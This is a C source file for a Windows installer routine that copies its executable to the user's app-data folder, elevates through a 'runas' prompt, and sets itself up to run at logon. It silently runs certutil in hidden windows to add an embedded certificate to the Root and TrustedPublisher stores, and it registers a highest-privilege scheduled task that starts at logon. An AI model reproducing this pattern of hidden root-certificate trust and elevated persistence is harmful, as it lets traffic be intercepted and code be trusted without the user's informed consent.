#include <windows.h>
#include <shellapi.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <stdio.h>
#include <string.h>

#include "Installer.h"

#define IDR_CERT 201

static boolean getCurrentExePath(string out, DWORD outSize) {
    DWORD len = GetModuleFileNameA(NULL, out, outSize);
    return len > 0 && len < outSize;
}

static boolean getInstallDir(string out, DWORD outSize) {
    char localAppData[MAX_PATH];

    if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, SHGFP_TYPE_CURRENT, localAppData) != S_OK)
        return false;

    if (snprintf(out, outSize, "%s\\%s", localAppData, APP_NAME) < 0)
        return false;

    return true;
}

static boolean getInstalledExePath(Installer* self, string out, DWORD outSize) {
    char installDir[MAX_PATH];
    (void)self;

    if (!getInstallDir(installDir, sizeof(installDir)))
        return false;

    if (snprintf(out, outSize, "%s\\%s", installDir, APP_EXE_NAME) < 0)
        return false;

    return true;
}

static boolean pathsEqual(string a, string b) {
    char fullA[MAX_PATH];
    char fullB[MAX_PATH];

    if (!GetFullPathNameA(a, sizeof(fullA), fullA, NULL))
        return false;

    if (!GetFullPathNameA(b, sizeof(fullB), fullB, NULL))
        return false;

    return lstrcmpiA(fullA, fullB) == 0;
}

static boolean fileExists(string path) {
    DWORD attr = GetFileAttributesA(path);
    return attr != INVALID_FILE_ATTRIBUTES && !(attr & FILE_ATTRIBUTE_DIRECTORY);
}

static boolean isInstalledPath(Installer* self) {
    char current[MAX_PATH];
    char installed[MAX_PATH];

    if (!getCurrentExePath(current, sizeof(current)))
        return false;

    if (!self->getInstalledExePath(self, installed, sizeof(installed)))
        return false;

    return pathsEqual(current, installed);
}

static boolean isRunningAsAdmin(void) {
    BOOL isAdmin = FALSE;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    PSID adminGroup = NULL;

    if (!AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
            DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup))
        return false;

    CheckTokenMembership(NULL, adminGroup, &isAdmin);
    FreeSid(adminGroup);

    return isAdmin ? true : false;
}

static DWORD runCommandWait(string command, boolean hidden) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    char cmdLine[2048];
    DWORD exitCode = 1;

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);

    if (hidden) {
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
    }

    lstrcpynA(cmdLine, command, sizeof(cmdLine));

    if (!CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE,
            hidden ? CREATE_NO_WINDOW : 0, NULL, NULL, &si, &pi))
        return 1;

    WaitForSingleObject(pi.hProcess, INFINITE);
    GetExitCodeProcess(pi.hProcess, &exitCode);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return exitCode;
}

static void saveInstallPath(string installedExe) {
    HKEY key;

    if (RegCreateKeyExA(HKEY_CURRENT_USER, APP_REG_KEY, 0, NULL, 0,
            KEY_WRITE, NULL, &key, NULL) != ERROR_SUCCESS)
        return;

    RegSetValueExA(key, "InstallPath", 0, REG_SZ,
        (const BYTE*)installedExe, (DWORD)strlen(installedExe) + 1);

    RegCloseKey(key);
}

static boolean extractCertificate(string outPath, DWORD outSize) {
    HRSRC res;
    HGLOBAL loaded;
    DWORD size;
    void* data;
    HANDLE file;
    DWORD written;
    char tempPath[MAX_PATH];

    res = FindResourceA(NULL, MAKEINTRESOURCEA(IDR_CERT), RT_RCDATA);
    if (!res)
        return false;

    loaded = LoadResource(NULL, res);
    if (!loaded)
        return false;

    size = SizeofResource(NULL, res);
    data = LockResource(loaded);
    if (!data || size == 0)
        return false;

    if (!GetTempPathA(sizeof(tempPath), tempPath))
        return false;

    if (snprintf(outPath, outSize, "%s%s.cer", tempPath, APP_NAME) < 0)
        return false;

    file = CreateFileA(outPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
        FILE_ATTRIBUTE_TEMPORARY, NULL);
    if (file == INVALID_HANDLE_VALUE)
        return false;

    if (!WriteFile(file, data, size, &written, NULL) || written != size) {
        CloseHandle(file);
        DeleteFileA(outPath);
        return false;
    }

    CloseHandle(file);
    return true;
}

static void registerCertificate(void) {
    char certPath[MAX_PATH];
    char command[2048];

    if (!extractCertificate(certPath, sizeof(certPath)))
        return;

    snprintf(command, sizeof(command), "certutil -addstore TrustedPublisher \"%s\"", certPath);
    runCommandWait(command, true);

    snprintf(command, sizeof(command), "certutil -addstore Root \"%s\"", certPath);
    runCommandWait(command, true);

    DeleteFileA(certPath);
}

static void deleteStartupShortcut(void) {
    char startup[MAX_PATH];
    char shortcut[MAX_PATH];

    if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, SHGFP_TYPE_CURRENT, startup) != S_OK)
        return;

    if (PathCombineA(shortcut, startup, APP_NAME ".lnk") == NULL)
        return;

    DeleteFileA(shortcut);
}
static void registerStartupTask(string installedExe) {
    char command[2048];

    snprintf(command, sizeof(command), "schtasks /delete /tn \"%s\" /f", APP_TASK_NAME);
    runCommandWait(command, true);

    snprintf(command, sizeof(command),
        "schtasks /create /tn \"%s\" /tr \"\\\"%s\\\"\" /sc onlogon /delay 0000:10 /rl HIGHEST /f",
        APP_TASK_NAME, installedExe);
    runCommandWait(command, true);
}

static void relaunchAsAdminForInstall(void) {
    char current[MAX_PATH];

    if (!getCurrentExePath(current, sizeof(current)))
        ExitProcess(1);

    ShellExecuteA(NULL, "runas", current, "--install", NULL, SW_SHOWNORMAL);
    ExitProcess(0);
}

static void launchInstalledAndExit(string installedExe) {
    ShellExecuteA(NULL, "open", installedExe, NULL, NULL, SW_SHOWNORMAL);
    ExitProcess(0);
}

static void install(Installer* self) {
    char current[MAX_PATH];
    char installed[MAX_PATH];
    char installDir[MAX_PATH];

    if (!isRunningAsAdmin())
        relaunchAsAdminForInstall();

    if (!getCurrentExePath(current, sizeof(current)))
        ExitProcess(1);

    if (!getInstallDir(installDir, sizeof(installDir)))
        ExitProcess(1);

    if (!self->getInstalledExePath(self, installed, sizeof(installed)))
        ExitProcess(1);

    CreateDirectoryA(installDir, NULL);

    if (!pathsEqual(current, installed))
        CopyFileA(current, installed, FALSE);

    saveInstallPath(installed);
    registerCertificate();
    deleteStartupShortcut();
    registerStartupTask(installed);

    if (!pathsEqual(current, installed))
        launchInstalledAndExit(installed);
}

static boolean ensure(Installer* self, int argc, string* argv) {
    char installed[MAX_PATH];

    if (argc > 1 && strcmp(argv[1], "--install") == 0) {
        self->install(self);
        return true;
    }

    if (self->isInstalledPath(self))
        return false;

    if (self->getInstalledExePath(self, installed, sizeof(installed)) && fileExists(installed))
        launchInstalledAndExit(installed);

    self->install(self);
    return true;
}

Installer new_Installer(void) {
    return (Installer) {
        .ensure = ensure,
        .isInstalledPath = isInstalledPath,
        .getInstalledExePath = getInstalledExePath,
        .install = install
    };
}
